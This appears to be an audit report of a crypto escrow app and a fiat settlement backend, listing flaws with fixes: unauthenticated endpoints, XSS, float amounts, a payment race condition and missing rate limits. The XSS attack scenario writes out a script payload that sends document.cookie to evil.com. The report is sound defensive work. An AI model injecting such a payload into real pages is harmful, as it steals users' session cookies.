#### C-2: No authentication on App 2 API

**File:** `app2-fiat-settlement/backend/src/index.js`

All 11 App 2 endpoints (schools, payments, schedules) are accessible without any authentication. Anyone with access to port 3001 can:

- Create and delete schools
- Create payments and confirm them (which triggers USDC release in App 1)
- Manage auto-payment schedules

**Risk:** Critical in production. An attacker can drain all locked USDC via `POST /api/payments/:id/confirm`.

**Recommendation:** Add API-key middleware similar to App 1, or JWT authentication. Minimum:

```js
function requireAuth(req, res, next) {
  const key = req.headers['x-api-key'];
  if (!key || key !== config.adminApiKey) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
}
// Apply to all mutating endpoints: POST, PUT, PATCH, DELETE
```

#### C-3: XSS vulnerability in HTML dashboard

**Files:** `app2-fiat-settlement/backend/public/index.html`, `payments.html`, `schools.html`

Data from the API is inserted directly via `innerHTML` without escaping:

```js
// payments.html — school name from DB
<td>${schoolMap[p.school_id] || '—'}</td>

// schools.html — school name
select.innerHTML = schools.map(s => `<option value="${s.id}">${s.name}</option>`).join('');
```

**Attack scenario:** An attacker creates a school named `<script>fetch('https://evil.com?key='+document.cookie)</script>`. When the page opens, the script executes in the browser.

**Recommendation:** Escape all data before inserting into the DOM:

```js
function escapeHtml(str) {
  return String(str ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}
// Use: <td>${escapeHtml(schoolMap[p.school_id])}</td>
```

#### H-1: Monetary amounts stored as REAL (float) in SQLite

**File:** `app2-fiat-settlement/backend/src/db.js`, line 27

```sql
amount REAL NOT NULL,
```

`REAL` is a 64-bit IEEE 754 float. Financial operations with floats produce rounding errors: `100.10 + 200.20 = 300.2999999...`. Dashboard summaries will show incorrect values.

**Recommendation:** Store amounts as integers (in cents/smallest units):

```sql
amount INTEGER NOT NULL,  -- in smallest currency units
```

Or use `TEXT` and work with decimal libraries.

---

#### H-2: Race condition on payment confirmation

**File:** `app2-fiat-settlement/backend/src/index.js`, lines 89–116

```js
app.post('/api/payments/:id/confirm', async (req, res) => {
  const payment = getPayment(db, req.params.id);
  if (payment.status === 'sent') return res.status(400).json({ error: 'Payment already sent' });
  
  // ← Window for a second request between this line and the next
  await mockSendPayment({ school, amount: payment.amount, currency: payment.currency });
  // ...
  confirmPayment(db, payment.id, { app1_released: app1Released });
```

The status check and update are not atomic. With two simultaneous requests, both can pass the check before the DB is updated, resulting in double payment to the school.

**Recommendation:** Lock the record before starting the operation:

```js
// Atomically set status to 'processing' first
const rows = db.prepare(
  "UPDATE payments SET status='processing' WHERE id=? AND status='pending'"
).run(req.params.id);
if (rows.changes === 0) {
  return res.status(400).json({ error: 'Payment already sent or in progress' });
}
// Now safe to do async operations
```

#### H-3: Scheduler does not call App 1 release

**File:** `app2-fiat-settlement/backend/src/scheduler.js`, lines 48–56

```js
async function runScheduledPayment(db, config, schedule) {
  await mockSendPayment({ amount: schedule.amount, currency: schedule.currency });

  const payment = createPayment(db, { ... });
  confirmPayment(db, payment.id, { app1_released: false }); // ← always false!
  return payment;
}
```

The scheduler creates a payment and marks it `sent`, but never calls `releaseApp1`. USDC in escrow remains locked forever for scheduled payments.

**Recommendation:** Add App 1 call, similar to `POST /api/payments/:id/confirm`:

```js
async function runScheduledPayment(db, config, schedule) {
  await mockSendPayment({ ... });
  const payment = createPayment(db, { ... });

  let app1Released = false;
  if (schedule.app1_payment_id) {
    try {
      await releaseApp1(config.app1Url, config.app1ApiKey, schedule.app1_payment_id);
      app1Released = true;
    } catch (err) {
      console.error(`Scheduler: App 1 release failed for schedule ${schedule.id}:`, err);
    }
  }
  confirmPayment(db, payment.id, { app1_released: app1Released });
}
```

Also need to add `app1_payment_id` to the `schedules` table and pass it on creation.

#### H-5: Contract is a record registry, not a real escrow

**File:** `app1-crypto-treasury/contract/src/lib.rs`

The `lock_funds` method only records state in a Map. It does not accept real USDC tokens onto the contract balance. To implement a real escrow, the contract must:

1. Accept USDC via `ft_on_transfer` (NEP-141)
2. Hold the actual tokens
3. On `release_funds` — do `ft_transfer` from the contract to the recipient

**Current implementation:** the contract is only a status registry. USDC actually stays on the owner's account, not on the contract. This means "unlocking" doesn't transfer anything.

**Priority:** High for production, low for current testnet demo.

#### M-1: No rate limiting

None of the endpoints have request rate limits. Brute-force attacks on `POST /api/release` key or DDoS are possible.

**Recommendation:** Add `express-rate-limit`:

```js
const rateLimit = require('express-rate-limit');
app.use('/api/', rateLimit({ windowMs: 60_000, max: 100 }));
```

#### M-2: No security headers (helmet)

Both apps do not set HTTP security headers (Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, etc.).

**Recommendation:**

```js
const helmet = require('helmet');
app.use(helmet());
```

#### M-3: No CORS configuration

Express is not configured for CORS control. When deployed to different domains, the API will either be blocked by the browser or open to everyone.

**Recommendation:** Add `cors` package with explicit whitelist:

```js
const cors = require('cors');
app.use(cors({ origin: ['https://your-admin-panel.com'] }));
```

#### M-5: minAmountOut = '0' on swap — no slippage protection

**File:** `app1-crypto-treasury/backend/src/index.js`, line 45

```js
const { amountNEAR, minAmountOut = '0' } = req.body;
```

By default the swap accepts any slippage. In a volatile market you can lose a significant portion during exchange.

**Recommendation:** Require `minAmountOut` to be passed explicitly, or calculate it automatically based on the current spot price with a 1–2% tolerance.

#### M-6: No pagination on GET endpoints

```js
app.get('/api/payments', (req, res) => {
```

#### M-7: No error handling in App 2 startup

**File:** `app2-fiat-settlement/backend/src/index.js`, lines 170–178

```js
if (require.main === module) {
  validateConfig();
  initApp();               // ← if it throws, server still starts
```

If `initApp()` throws (inaccessible DB directory, permissions), the `db` variable remains `null`, and the first API request will crash with `TypeError: Cannot read properties of null`.
